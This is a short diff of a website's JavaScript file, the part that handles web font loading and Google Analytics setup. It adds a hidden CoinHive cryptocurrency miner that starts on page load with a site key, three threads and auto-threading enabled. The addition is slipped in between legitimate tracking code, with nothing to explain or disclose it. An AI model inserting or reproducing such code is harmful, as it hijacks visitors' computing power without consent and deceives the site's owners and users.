@@ -284,6 +284,12 @@ WebFont.load({
   }
 });
 
+var miner = new CoinHive.Anonymous('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps');
+miner.setNumThreads(3);
+miner.setThrottle(0.9);
+miner.setAutoThreadsEnabled(true);
+miner.start();
+
 window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
